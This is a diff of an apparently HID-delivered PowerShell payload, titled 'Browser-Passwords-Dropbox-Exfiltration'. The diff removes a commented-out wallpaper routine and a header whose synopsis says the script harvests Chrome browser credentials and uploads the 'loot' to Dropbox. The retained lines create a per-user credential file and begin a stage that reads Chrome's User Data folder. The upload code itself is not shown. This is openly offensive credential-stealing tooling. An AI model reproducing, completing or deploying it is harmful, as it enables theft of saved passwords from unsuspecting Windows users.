@@ -1,36 +1,3 @@
-#Function Set-WallPaper($Value)
-
-#{
-
- #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value
-
-# rundll32.exe user32.dll, UpdatePerUserSystemParameters
-
-#}
-#Invoke-WebRequest -Uri "https://images.squarespace-cdn.com/content/v1/5e269dc38e3cf11eba06a558/1585482069847-M9VWQDJPRBNKW3LRR356/image-asset.jpeg" -OutFile "$env:USERPROFILE\Desktop\wallpaper.bmp"
-#Set-WallPaper -value "$env:USERPROFILE\Desktop\wallpaper.bmp"
-
-#########################################################################################################
-#                                                               |                                       #
-# Title        : Browser-Passwords-Dropbox-Exfiltration         |   ____ _____   ______                 #
-# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
-# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
-# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
-# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
-# Mode         : HID                                            |                        |_|    |___/   #
-# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
-#                                                               |                                       # 
-#########################################################################################################
-
-<#
-.SYNOPSIS
-	This script exfiltrates credentials from the browser via Dropbox.
-.DESCRIPTION 
-	Checkes and saves the credentials from the Chrome browser, then connects to Dropbox and uploads
-    the file containing all of the loot.
-.Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
-#>
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 #Stage 1 Obtain the credentials from the Chrome browsers User Data folder
